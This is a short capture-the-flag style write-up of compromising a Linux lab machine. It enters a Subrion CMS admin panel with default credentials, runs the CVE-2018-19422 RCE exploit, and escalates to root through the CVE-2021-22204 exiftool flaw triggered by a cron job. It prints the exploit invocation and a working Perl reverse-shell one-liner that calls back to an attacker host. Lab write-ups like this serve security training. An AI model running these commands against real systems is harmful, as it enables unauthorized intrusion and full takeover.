# Exfiltrated (Linux)

## Initial Foothold

Added the target hostname to `/etc/hosts` for easier access. Identified a Subrion CMS admin panel and successfully logged in with default credentials `admin:admin`. Cloned the [CVE-2018-19422 SubrionCMS RCE exploit](https://github.com/hev0x/CVE-2018-19422-SubrionCMS-RCE) and ran:

    sudo python3 SubrionRCE.py -u http://192.168.173.163/panel/ -l admin -p admin

Obtained a shell using a Perl reverse shell (only Perl, not /bin/sh, worked) after starting a netcat listener on port 80:

    perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.45.166:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'

Upgraded to a stable shell using Python3.

## Privilege Escalation

Ran `linpeas.sh` and found a root cron job running `exiftool` on an uploaded image. Used the [CVE-2021-22204 exiftool exploit](https://github.com/mr-tuhin/CVE-2021-22204-exiftool), uploaded a malicious image to the target's uploads folder, started a netcat listener on port 80, and received a root shell when the cron executed.
